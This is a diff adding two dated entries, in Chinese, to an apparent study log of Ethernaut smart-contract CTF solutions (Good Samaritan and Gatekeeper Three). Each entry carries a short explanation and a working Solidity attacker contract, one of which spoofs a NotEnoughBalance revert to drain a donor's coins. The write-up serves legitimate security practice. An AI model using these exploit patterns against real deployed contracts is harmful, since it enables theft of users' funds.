@@ -292,5 +292,60 @@ contract AttackDenial {
 4. 调用 Unstake，将所有数量取出
 实例地址：0x8F4BDfE756B27102E891B9fC1F623c1c1138279C
 
+### 2024.09.13
+#### Ethernaut - Good Samaritan
+可以发现，Good Samaritan 会在 Wallet 抛出 NotEnoughBalance 错误时，把所有资产都转给调用者。同时 Wallet 底层的 Coin 会在转账时，调用对方的 notify 方法。我们只需要在 notify 中实现 抛出 NotEnoughBalance 错误就行。
+需要注意，为了防止 Good Samaritan 在将所有资产都转给调用合约时，也触发 notify 方法，需要结合 notify 的入参的进行判断。
+地址实例：0x4920eBb362bdBa68bfC548F34faaAa86A6C828D1
+```
+contract AttackGoodSamaritan is INotifyable {
+    error NotEnoughBalance();
+    
+    function notify(uint256 amount) external {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+
+    function requestDonation(address d) public  {
+        GoodSamaritan(d).requestDonation();
+    }
+}
+```
+
+
+### 2024.09.14
+#### Ethernaut - Gatekeeper Three
+满足题目的三个 modifier，就可以成为参赛者。
+实例地址：0x784872141affcfD443a6f43093Ed81B0BB6d6D04
+```
+contract AttackGatekeeperThree {
+    address public gateAddr;
+
+    constructor(address addr) {
+        gateAddr = addr;
+    }
+
+    error Error1();
+
+    function setConstruct0r() public {
+        GatekeeperThree(payable (gateAddr)).construct0r();
+    }
+
+    function getAllowance() public {
+        uint256 t = block.timestamp;
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+    }
+
+    function setEnter() public {
+        GatekeeperThree(payable (gateAddr)).enter();
+    }
+
+    receive() external payable {
+        revert Error1();
+    }
+}
+```
 
 <!-- Content_END -->
